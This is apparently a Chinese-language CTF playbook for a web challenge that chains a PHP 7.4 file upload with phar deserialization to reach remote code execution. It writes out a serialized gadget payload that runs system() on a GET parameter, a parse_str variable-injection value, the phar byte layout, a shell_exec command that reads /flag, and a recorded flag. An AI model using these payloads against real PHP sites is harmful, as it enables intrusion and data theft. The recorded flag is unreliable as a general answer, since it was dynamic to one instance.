# upup_exec（决赛测试赛 · Web · 200 分 · 需现场靶机）

PHP 7.4 文件上传 + phar 反序列化 RCE。**动态靶机题：flag 在决赛实例上，无离线答案，按本流程现场打。**
与 WEB-05（初赛）同族但析构手法不同：本题全局 metadata 放合法 AnyClass gadget，
唯一条目的 metadata 故意写成不可反序列化的 `x:3:"str";`，让 phar 在 manifest 解析期
失败、归档在**请求中途**被释放 → `__destruct` 立即触发。

## 现场流程（对决赛靶机执行）

```bash
# 0) 先取源码：dirsearch 找 /www.zip（整站备份，三层混淆解出 upload.php 真实逻辑）
#    并确认 Apache mod_php / PHP 7.4 系
# 1) 一条命令完成 上传 phar → parse_str 触发 → 自动找 flag（纯标准库，无依赖）
python3 /opt/solver/knowledges/xihulunjian/challenges/upup_exec/exp/solve.py <host:port> [命令]
#    phar 落盘路径与源码不符时用环境变量覆盖：
PHAR_ABS=/var/www/html/uploaded_images/evil_rce.phar python3 ... solve.py <host:port>
```

脚本自动打三步：上传 `evil_rce.phar`（期望响应含 `Uploaded successfully`）→ 用 `id`
做 RCE sanity → 抓 `flag{...}` / 32 位 hex / 测试赛形态的裸长数字。响应里在
`ok` / `Fatal error` **之前**出现的输出就是命令结果（页面恒以未捕获 `throw Error` 收尾，
HTTP 500 属预期，脚本已吞）。要跑任意命令就带第二参数。

## 原理（备查）

- 两层过滤：扩展名黑名单精确匹配（php/PHP/phtml/sh/pht/htaccess/user.ini/asp/aspx/jsp，
  **无 phar**）+ 大小 ≤8192 + finfo MIME 必须 `image/*`（stub 以 `GIF89a` 开头即判
  image/gif）。落盘 `uploaded_images/<name>`。
- move 成功后 `@parse_str($_POST['upload']); if (file_exists($b))` —— PHP 7 单参
  parse_str 注入局部变量，POST `upload=b=phar://<绝对路径>` 覆盖 `$b`，file_exists 对
  phar:// 流触发元数据反序列化。
- class `AnyClass::__destruct(){ eval($this->output); }` 是 sink；phar 的全局 metadata
  = `O:8:"AnyClass":1:{s:6:"output";s:42:"if(isset($_GET['c'])){system($_GET['c']);}";}`
  （sha256 无关紧要，eval 内容经 `?c=` 传命令）。
- **核心（与 WEB-05 的差异）**：页面结尾恒 `throw new Error("start")`，干净 phar 的
  metadata 对象要等请求关闭阶段才释放，未捕获异常路径跳过 shutdown 析构 → 永不触发。
  本题把**条目** metadata 写成 `x:3:"str";`（长度 11 与内容一致、SHA-1 重算有效）：
  PHP ≤8.2 在 `phar_parse_pharfile()` 解析 manifest 时**急切**反序列化条目 metadata，
  在此失败 → `MAPPHAR_FAIL` → 失败路径 `phar_destroy_phar_data()` 在**请求中途**释放
  归档 → 全局 metadata 的 AnyClass 随之析构 → `eval` 抢在 throw 之前执行。
- phar 手工构造（solve.py `build_phar()`，纯 python）：stub `GIF89a<?php __HALT_COMPILER(); ?>\r\n`
  | u32 manifest_len | 条目数 1 | API 版本 1.1.1(0x0011) | flags 0x10000(SHA-1 签名)
  | alias 空 | 全局 metadata | 单条目(name/size/ts/crc32/flags 0644/条目 metadata) |
  数据 `b` | SHA-1 20B | u32 算法 2 | `GBMB`。签名覆盖 stub+manifest+data，改字节必须重算。

## 本地验证（2026-09-11，aegisx/solver:full 的 PHP 8.4，仅结构不验行为）

- `build_phar()` 产出的 clean/evil 两变体与 PHP 8.4 原生 `Phar` API 构建的参照件
  **逐字段一致**（stub/manifest_len/条目数/版本 0x0011/全局 flags/全局 metadata/条目
  name·size·crc32·flags 0644·metadata/数据/算法 2/GBMB，三方均 211 字节）。
- PHP 打开 clean 变体：验签通过（改 1 字节即报 `broken signature`，证明验签真实生效）、
  全局 metadata 反序列化出 AnyClass gadget、条目内容/条目 metadata 可读、
  `file_exists("phar://clean.phar/a.txt")` 走通。
- evil 变体（条目 metadata `x:3:"str";`）：8.4 打开正常（8.3+ 条目 metadata 改惰性），
  但一经访问即 `unserialize(): Error at offset 0 of 10 bytes` —— 正是喂给 7.4 解析期
  的那口毒，且签名仍有效。「请求中途析构」的时机差异无法在 8.4 复现，目标 7.4 成立
  由测试赛 transcript 实证（31 分钟解出）。

## 失败分支

- **PHP 版本差异**：靶机若 ≥8.3，条目 metadata 惰性解析，本题手法不触发——改打全局
  metadata：把 `:1:{` 改成 `:2:{`（WEB-05 式半成品对象，unserialize 期间立即析构，
  全版本急切），SHA-1 重算后重传。
- **上传被拒排查**：响应无 `Uploaded successfully` → 文件名后缀不在黑名单（`.phar`
  未被列）、内容 ≤8192、stub 以 `GIF89a` 开头过 finfo；被 WAF 拦 multipart 时换
  `image/gif` 以外的 image/* MIME 再试。
- **无回显 / 只有 ok+Fatal**：把命令换成写文件回读——
  `file_put_contents('uploaded_images/r.txt', shell_exec("cat /flag*"));`
  然后直访 `/uploaded_images/r.txt`。
- **触发失败但上传成功**：PHAR_ABS 路径猜错（`ls uploaded_images/` 确认落盘名）；
  或目标非 PHP 7 系（parse_str 单参变量覆盖在 PHP 8 已移除，需改走 phar:// 直链等其他
  注入点）。
- flag 读到但形态怪：测试赛 flag 是裸长数字（见下），extract_flags 三种模式都认。

## 决赛实测备忘

- 决赛测试赛（2026-09-10）31 分钟解出，靶机 Apache mod_php + PHP 7.4，web 根
  `/var/www/html`，flag 在 `/flag`。第一步 dirsearch 找 `/www.zip` 是本题入口
  （upload.php 三层混淆，本地 php 逐层剥可得真实过滤逻辑）。
- 测试赛 flag（动态，**勿直接提交**）：`10625892386034338937447170285653`。
